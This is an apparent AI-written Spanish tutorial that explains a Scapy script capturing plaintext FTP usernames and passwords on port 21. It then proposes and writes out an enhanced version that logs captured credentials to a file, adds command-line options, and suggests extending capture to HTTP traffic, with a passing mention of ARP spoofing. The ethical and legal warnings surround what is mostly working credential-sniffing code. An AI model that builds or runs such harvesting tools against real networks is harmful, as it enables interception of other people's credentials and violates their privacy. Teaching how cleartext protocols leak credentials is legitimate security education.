
---

### **Código**
```python
from scapy.all import sniff, Raw

def analisis(paquete):
    if paquete.haslayer(Raw):
        texto = paquete[Raw].load.decode('utf-8', errors='ignore')
        if 'USER' in texto or 'PASS' in texto:
            print(texto)
    
sniff(iface="eth0", prn=analisis, filter="tcp port 21", store=0)
```

---

### **Análisis Paso a Paso**

#### **1. Importación de Módulos**
```python
from scapy.all import sniff, Raw
```
- **`sniff`**: Función de Scapy que captura paquetes de red en tiempo real.
- **`Raw`**: Clase que representa la capa de carga útil (datos crudos) de un paquete. En protocolos como FTP, esta capa contiene los comandos y datos enviados (por ejemplo, `USER` y `PASS`).
- **Scapy** es una biblioteca poderosa para capturar, analizar y manipular paquetes de red a nivel de bajo nivel.

#### **2. Función `analisis(paquete)`**
```python
def analisis(paquete):
    if paquete.haslayer(Raw):
        texto = paquete[Raw].load.decode('utf-8', errors='ignore')
        if 'USER' in texto or 'PASS' in texto:
            print(texto)
```
- **Propósito**: Procesa cada paquete capturado para extraer y mostrar credenciales FTP (`USER` para nombre de usuario, `PASS` para contraseña).
- **Desglose**:
  1. **`if paquete.haslayer(Raw)`**:
     - Verifica si el paquete tiene una capa `Raw`, que contiene los datos de la aplicación (en este caso, comandos FTP).
     - No todos los paquetes TCP tienen una capa `Raw` (por ejemplo, los paquetes de control como SYN o ACK no la tienen).
  2. **`texto = paquete[Raw].load.decode('utf-8', errors='ignore')`**:
     - `paquete[Raw].load`: Accede a los datos crudos (en formato de bytes) de la capa `Raw`.
     - `.decode('utf-8', errors='ignore')`: Convierte los bytes a una cadena de texto en codificación UTF-8. Si hay bytes no válidos (por ejemplo, datos binarios), los ignora en lugar de generar un error.
  3. **`if 'USER' in texto or 'PASS' in texto`**:
     - Filtra los paquetes para imprimir solo aquellos que contienen las cadenas `USER` o `PASS`, que corresponden a comandos FTP para autenticación.
     - Esto asegura que solo se muestren las credenciales, reduciendo el ruido en la salida.
  4. **`print(texto)`**:
     - Imprime el texto sin modificaciones adicionales (por ejemplo, sin eliminar espacios o añadir prefijos).

#### **3. Captura de Paquetes**
```python
sniff(iface="eth0", prn=analisis, filter="tcp port 21", store=0)
```
- **Propósito**: Configura la captura de paquetes en tiempo real y procesa cada paquete con la función `analisis`.
- **Parámetros**:
  1. **`iface="eth0"`**:
     - Especifica que la captura se realizará en la interfaz de red `eth0` (típicamente una interfaz Ethernet en sistemas Linux).
     - Esto es crucial en sistemas con múltiples interfaces (por ejemplo, Wi-Fi, VPN) para asegurar que Scapy capture en la interfaz correcta.
  2. **`prn=analisis`**:
     - Indica que cada paquete capturado se pasará a la función `analisis` para su procesamiento en tiempo real.
     - A diferencia de los fragmentos anteriores, que almacenaban los paquetes y luego los procesaban, aquí el procesamiento es **en línea**, lo que reduce el uso de memoria.
  3. **`filter="tcp port 21"`**:
     - Aplica un filtro **BPF** (Berkeley Packet Filter) para capturar solo paquetes TCP en el puerto 21, que corresponde al protocolo FTP.
     - Esto asegura que solo se analice el tráfico relevante.
  4. **`store=0`**:
     - Indica que los paquetes capturados **no se almacenarán** en memoria.
     - Esto mejora la eficiencia, ya que el script no guarda una lista de paquetes (como en los fragmentos anteriores con `paquetes = sniff(...)`), sino que los procesa y descarta inmediatamente.
- **Comportamiento**:
  - La captura continúa indefinidamente hasta que el usuario la detiene manualmente (por ejemplo, con `Ctrl+C`).
  - No hay límites de tiempo (`timeout`) ni de número de paquetes (`count`), a diferencia de los fragmentos anteriores.

---

### **Diferencias con los Fragmentos Anteriores**
Este código es una evolución del **Fragmento 5** de la pregunta anterior, con mejoras significativas en eficiencia y simplicidad. Comparémoslo:

1. **Procesamiento en Línea**:
   - **Fragmento 5**: Captura todos los paquetes (`count=9999`), los almacena en una lista (`paquetes`), y luego los procesa en un bucle `for`.
   - **Nuevo Código**: Usa `prn=analisis` para procesar cada paquete en tiempo real, y `store=0` evita almacenar los paquetes, reduciendo el uso de memoria.

2. **Sin Límites Arbitrarios**:
   - **Fragmento 5**: Limita la captura a 9999 paquetes, lo que puede ser insuficiente o excesivo.
   - **Nuevo Código**: Captura indefinidamente hasta que se detiene manualmente, lo que es más flexible.

3. **Mantiene el Filtrado Específico**:
   - Ambos scripts filtran paquetes con `USER` o `PASS`, enfocándose en credenciales FTP.
   - Sin embargo, el nuevo código es más conciso al eliminar el bucle `for` explícito.

4. **Interfaz Específica**:
   - Ambos usan `iface="eth0"`, asegurando que la captura se realice en la interfaz correcta.

---

### **Propósito y Contexto**
- **Propósito**: Interceptar nombres de usuario y contraseñas enviados en texto plano a través del protocolo FTP (puerto 21) en una red.
- **Contexto**: 
  - FTP es un protocolo inseguro que transmite datos, incluidos comandos de autenticación (`USER`, `PASS`), sin cifrado.
  - Este script demuestra cómo un atacante (o un auditor de seguridad) podría capturar credenciales en una red donde se usa FTP.
  - **Uso típico**: Pruebas de seguridad autorizadas, auditorías de red, o entornos educativos para demostrar vulnerabilidades.

**Advertencia Ética y Legal**:
- Interceptar tráfico de red sin permiso es **ilegal** en muchos países y puede violar leyes de privacidad (por ejemplo, la Ley de Protección de Datos en la UE o el Wiretap Act en EE.UU.).
- Este código debe usarse **solo** en entornos controlados, como redes propias o con consentimiento explícito (por ejemplo, en pruebas de penetración autorizadas).
- En entornos reales, protocolos seguros como **SFTP** o **FTPS** han reemplazado a FTP debido a estas vulnerabilidades.

---

### **Cómo Funciona en la Práctica**
1. **Requisitos**:
   - Instalar Scapy: `pip install scapy`.
   - Ejecutar el script con permisos de administrador (necesario para capturar paquetes):
     - Linux: `sudo python3 script.py`.
     - Windows: Ejecutar como administrador.
   - La interfaz `eth0` debe existir. Para verificar interfaces disponibles:
     ```python
     from scapy.all import get_if_list
     print(get_if_list())
     ```

2. **Escenario de Uso**:
   - Configura un servidor FTP en tu red (por ejemplo, usando `vsftpd` en Linux).
   - Conecta un cliente FTP (por ejemplo, `ftp` en la terminal o FileZilla) al servidor.
   - Ejecuta el script en un dispositivo que pueda ver el tráfico de red (por ejemplo, en la misma máquina que el servidor o cliente, o en un punto intermedio como un switch en modo promiscuo).
   - Cuando el cliente envíe comandos `USER` o `PASS`, el script los detectará y mostrará.

3. **Salida Esperada**:
   - Si un cliente envía:
     ```
     USER admin
     PASS secreto123
     ```
   - El script imprimirá:
     ```
     USER admin
     PASS secreto123
     ```

4. **Limitaciones del Entorno**:
   - El dispositivo debe estar en la misma red que el tráfico FTP o en un punto donde pueda capturar los paquetes (por ejemplo, un switch en modo promiscuo o usando ARP spoofing, aunque esto es avanzado y éticamente cuestionable).
   - En redes modernas, el tráfico FTP es raro debido a su inseguridad, por lo que es más común en entornos de prueba.

---

### **Mejoras Posibles**
Aunque este código es eficiente y funcional, aquí hay algunas mejoras para hacerlo más robusto, usable y seguro:

1. **Manejo de Errores**:
   - Agregar un bloque `try`/`except` para manejar errores de decodificación u otros problemas.
   ```python
   try:
       texto = paquete[Raw].load.decode('utf-8', errors='ignore')
       if 'USER' in texto or 'PASS' in texto:
           print(f"[+] Capturado: {texto.strip()}")
   except Exception as e:
       print(f"[-] Error: {e}")
   ```

2. **Filtrado Más Preciso**:
   - Usar expresiones regulares para capturar `USER` y `PASS` con mayor precisión, evitando falsos positivos.
   ```python
   import re
   if re.search(r'^(USER|PASS)\s+(.+)$', texto):
       print(f"[+] Capturado: {texto.strip()}")
   ```

3. **Salida Formateada**:
   - Guardar las credenciales en un archivo o mostrarlas con un formato claro (por ejemplo, separar usuario y contraseña).
   ```python
   with open('credenciales.txt', 'a') as f:
       f.write(f"{texto.strip()}\n")
   ```

4. **Parámetros Configurables**:
   - Permitir al usuario especificar la interfaz, puerto, o duración de captura mediante argumentos de línea de comandos.
   ```python
   import argparse
   parser = argparse.ArgumentParser(description="Captura credenciales FTP")
   parser.add_argument('--iface', default='eth0', help='Interfaz de red')
   parser.add_argument('--timeout', type=int, help='Tiempo de captura (segundos)')
   args = parser.parse_args()
   sniff(iface=args.iface, prn=analisis, filter="tcp port 21", store=0, timeout=args.timeout)
   ```

5. **Soporte para Otros Protocolos**:
   - Extender el script para capturar credenciales en otros protocolos en texto plano (por ejemplo, HTTP en `tcp port 80`).
   ```python
   filter="tcp port 21 or tcp port 80"
   ```

6. **Detención Controlada**:
   - Agregar un mecanismo para detener la captura después de un tiempo o al capturar credenciales específicas.
   ```python
   sniff(iface="eth0", prn=analisis, filter="tcp port 21", store=0, timeout=60)
   ```

---

### **(Ejemplo)**

```python
from scapy.all import sniff, Raw
import argparse
import re

def analisis(paquete):
    if paquete.haslayer(Raw):
        try:
            texto = paquete[Raw].load.decode('utf-8', errors='ignore')
            if re.search(r'^(USER|PASS)\s+(.+)$', texto):
                credencial = texto.strip()
                print(f"[+] Capturado: {credencial}")
                with open('credenciales.txt', 'a') as f:
                    f.write(f"{credencial}\n")
        except Exception as e:
            print(f"[-] Error al procesar paquete: {e}")

def main():
    parser = argparse.ArgumentParser(description="Captura credenciales FTP")
    parser.add_argument('--iface', default='eth0', help='Interfaz de red')
    parser.add_argument('--timeout', type=int, default=60, help='Tiempo de captura (segundos)')
    args = parser.parse_args()

    print(f"[*] Capturando en {args.iface} durante {args.timeout} segundos...")
    sniff(iface=args.iface, prn=analisis, filter="tcp port 21", store=0, timeout=args.timeout)

if __name__ == "__main__":
    main()
```

**Mejoras Incluidas**:
- Manejo de errores.
- Filtrado con expresiones regulares.
- Guardado de credenciales en un archivo.
- Configuración mediante argumentos de línea de comandos.
- Límite de tiempo para la captura.

---

### **Conclusión**
El código proporcionado es una versión optimizada y eficiente de los scripts anteriores, utilizando procesamiento en tiempo real (`prn=analisis`) y evitando el almacenamiento de paquetes (`store=0`). Se enfoca en capturar credenciales FTP (`USER`, `PASS`) en la interfaz `eth0`, siendo ideal para pruebas de seguridad o demostraciones educativas. Sin embargo, carece de manejo de errores y opciones configurables, que pueden añadirse para hacerlo más robusto.

**Consideraciones Finales**:
- Usa este código **solo** en entornos autorizados para evitar problemas legales.
- En redes reales, el tráfico FTP es raro, por lo que este script es más útil en entornos de prueba o auditorías.
- Protocolos seguros como SFTP o FTPS deben usarse en producción para proteger las credenciales.
